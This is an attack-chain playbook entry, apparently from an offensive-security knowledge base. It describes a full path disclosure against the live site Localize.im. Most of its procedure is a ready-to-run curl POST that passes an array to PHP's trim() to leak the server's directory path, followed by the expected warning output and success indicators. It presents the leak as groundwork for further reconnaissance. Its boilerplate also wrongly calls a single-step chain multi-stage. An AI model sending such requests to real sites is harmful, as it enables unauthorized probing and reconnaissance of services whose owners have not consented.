---
id: ac-fpd-localize-im-001
name: Full Path Disclosure via Malformed Array Parameters in Localize.im
tags:
  - fpd
  - information-disclosure
  - php
  - web-vuln
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Trigger-PHP-Trim-Error-for-Full-Path-Disclosure]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:06.185Z'
description: >-
  A single-step attack exploiting a PHP type error in the Localize.im web
  application to disclose the server's internal file path through improper
  handling of array parameters in POST requests.
skill_level: beginner
impact_level: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Full Path Disclosure via Malformed Array Parameters in Localize.im

Multi-stage attack chain demonstrating a complete attack workflow.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Web Request] --> B[Trigger Vulnerability]
    B --> C[Path Disclosure]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[commands/curl-post-malformed-array]]

### Target Environment

- Web platform running PHP application (e.g., Localize.im)
- Access to project and language endpoints
- No specific ports required beyond standard HTTPS (443)

### Initial Access Requirements

- Valid CSRF token from the application
- Knowledge of project ID and language ID
- Network access to the target web application
- No prior credentials needed beyond session for CSRF

## Detailed Attack Procedures

### Step 1: Trigger Full Path Disclosure
procedure: [[procedures/Trigger-PHP-Trim-Error-for-Full-Path-Disclosure]]

**Objective**: Send a malformed POST request to the languages update endpoint to force a PHP trim() function error, disclosing the internal server file path.

**Instructions**: Authenticate to the application to obtain a CSRF token, then craft and send a POST request using [[commands/curl-post-malformed-array]] to the target endpoint, appending '[]' to array parameters like updatePhrases[previous][ID][0] to pass an array instead of a string to trim().

```bash
curl -X POST 'https://www.localize.im/projects/[PROJECT_ID]/languages/[LANGUAGE_ID]' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'CSRFToken=[YOUR_CSRF_TOKEN]&updatePhrases[previous][yxr][0]=&updatePhrases[edits][yxr][0]=&updatePhrases[previous][yxq][0]=&updatePhrases[secret]=[SECRET_CODES]&updatePhrases[translatorID]=[YOUR_ID]&updatePhrases[previous][testID][0][]='
```

Replace placeholders like [PROJECT_ID], [LANGUAGE_ID], [YOUR_CSRF_TOKEN], [SECRET_CODES], and [YOUR_ID] with actual values from the application.

**Expected Output**: A PHP warning in the response, such as "Warning: trim() expects parameter 1 to be string, array given in /srv/data/web/vhosts/www.localize.im/htdocs/index.php on line 191", revealing the full server path.

**Success Indicators**:
- PHP warning message appears in the HTTP response
- Internal file path (e.g., /srv/data/web/vhosts/www.localize.im/htdocs/index.php) is disclosed
- No other errors or redirects occur

## Attack Chain Summary

### Key Achievements

1. Successful disclosure of server internal file path without authentication bypass
2. Exposure of directory structure for potential further reconnaissance or attacks
3. Demonstration of PHP type handling vulnerability in web applications

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
